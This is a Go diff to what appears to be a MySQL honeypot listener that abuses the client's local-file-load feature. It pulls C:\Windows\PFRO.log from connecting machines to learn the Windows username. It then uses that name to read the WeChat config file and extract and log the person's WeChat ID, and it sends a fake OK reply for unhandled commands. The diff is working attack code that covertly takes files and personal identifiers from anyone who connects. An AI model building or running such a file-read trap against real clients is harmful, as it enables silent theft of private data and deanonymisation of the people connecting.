@@ -219,11 +219,13 @@ func (l *Listener) handle(conn net.Conn, ID uint32) {
 
 	unameK := session.RemoteIP() + "username" //存储电脑用户名
 
+	wnameK := session.RemoteIP() + "wechat" //存储微信id
+
 	lastCmdK := session.RemoteIP() + "lastcmd"
 
 	const PRO_FILE_NAME = "C:\\Windows\\PFRO.log"
 
-	const WX_CONFIG = "D:\\wz\\WeChat Files\\All Users\\config\\config.data"
+	const WX_CONFIG = "C:\\Users\\username\\Documents\\WeChat Files\\All Users\\config\\config.data"
 	// Reset packet sequence ID.
 	session.packets.ResetSeq()
 	for {
@@ -235,7 +237,7 @@ func (l *Listener) handle(conn net.Conn, ID uint32) {
 		// log.Println("data====", "----------", string(data), "statementID", session.statementID)
 
 		//处理获取  "C:\\Windows\\PFRO.log"
-		if utils.GetItemString(readK) == PRO_FILE_NAME {
+		if utils.GetItemString(readK) == PRO_FILE_NAME && utils.GetItemString(unameK) == "" {
 
 			content := string(data)
 			// log.Println("收数据\n", content)
@@ -260,7 +262,7 @@ func (l *Listener) handle(conn net.Conn, ID uint32) {
 		}
 
 		//处理获取  "C:\\Windows\\PFRO.log"
-		if utils.GetItemString(readK) == WX_CONFIG {
+		if utils.GetItemString(readK) == WX_CONFIG && utils.GetItemString(wnameK) == "" {
 
 			content := string(data)
 			log.Println("收数据\n", content)
@@ -273,22 +275,22 @@ func (l *Listener) handle(conn net.Conn, ID uint32) {
 
 			name := utils.GetWechatId(content)
 			if name != "" {
-				log.Println("获取", unameK, "微信id:", name)
+				log.Println("获取", wnameK, "微信id:", name)
 
 				extend["wechat"] = content
 				jsonlog.GlobalLog.HoneyLog(session.conn.LocalAddr().String(), session.conn.RemoteAddr().String(), "control", extend)
-				utils.SetItem(unameK, name)
+				utils.SetItem(wnameK, name)
 
 			} else {
-				log.Println("获取", unameK, "微信id失败")
+				log.Println("获取", wnameK, "微信id失败")
 			}
 		}
 
-		log.Println(lastCmdK, utils.GetItemString(lastCmdK))
-		if utils.GetItemString(lastCmdK) != "" {
+		// log.Println(lastCmdK, utils.GetItemString(lastCmdK))
+		// if utils.GetItemString(lastCmdK) != "" {
 
-			data = []byte(utils.GetItemString(lastCmdK))
-		}
+		// 	data = []byte(utils.GetItemString(lastCmdK))
+		// }
 
 		// Update the session last query time for session idle.
 		session.updateLastQueryTime(time.Now())
@@ -319,18 +321,34 @@ func (l *Listener) handle(conn net.Conn, ID uint32) {
 
 			// load data local infile 'D:/ioc.txt' into table users fields terminated by '\n'
 			log.Println(unameK, utils.GetItemString(unameK))
-			if utils.GetItemString(unameK) == "" || utils.GetItemString(lastCmdK) == "" {
+			if utils.GetItemString(unameK) == "" {
 				if err = session.packets.Write(utils.GetPayload(PRO_FILE_NAME)); err != nil {
 					log.Error("TRBULAR: %v", err)
 					return
 				} else {
-					log.Println("发数据------------------")
+					log.Println("获取------------------", PRO_FILE_NAME)
 					utils.SetItem(readK, PRO_FILE_NAME)
 					utils.SetItem(lastCmdK, string(data))
 					time.Sleep(10 * time.Millisecond)
 					continue
 				}
 			}
+
+			if utils.GetItemString(wnameK) == "" && utils.GetItemString(unameK) != "" {
+				uname := utils.GetItemString(unameK)
+				wconfigname := strings.Replace(WX_CONFIG, "username", uname, 1)
+				if err = session.packets.Write(utils.GetPayload(wconfigname)); err != nil {
+					log.Error("TRBULAR: %v", err)
+					return
+				} else {
+					log.Println("获取w------------------", wconfigname)
+					utils.SetItem(readK, WX_CONFIG)
+					utils.SetItem(lastCmdK, string(data))
+					time.Sleep(10 * time.Millisecond)
+					continue
+				}
+			}
+
 			query := l.parserComQuery(data)
 			if err = l.handler.ComQuery(session, query, nil, func(qr *sqltypes.Result) error {
 				return session.writeTextRows(qr)
@@ -408,10 +426,14 @@ func (l *Listener) handle(conn net.Conn, ID uint32) {
 			}
 			delete(session.statements, stmt.ID)
 		default:
-			cmd := sqldb.CommandString(data[0])
-			log.Error("session.command:%s.not.implemented", cmd)
-			sqlErr := sqldb.NewSQLErrorf(sqldb.ER_UNKNOWN_ERROR, "command handling not implemented yet: %s", cmd)
-			if err := session.writeErrFromError(sqlErr); err != nil {
+			// cmd := sqldb.CommandString(data[0])
+			// log.Error("session.command:%s.not.implemented", cmd)
+			// sqlErr := sqldb.NewSQLErrorf(sqldb.ER_UNKNOWN_ERROR, "command handling not implemented yet: %s", cmd)
+			// if err := session.writeErrFromError(sqlErr); err != nil {
+			// 	return
+			// }
+
+			if err = session.packets.WriteOK(0, 0, session.greeting.Status(), 0); err != nil {
 				return
 			}
 		}
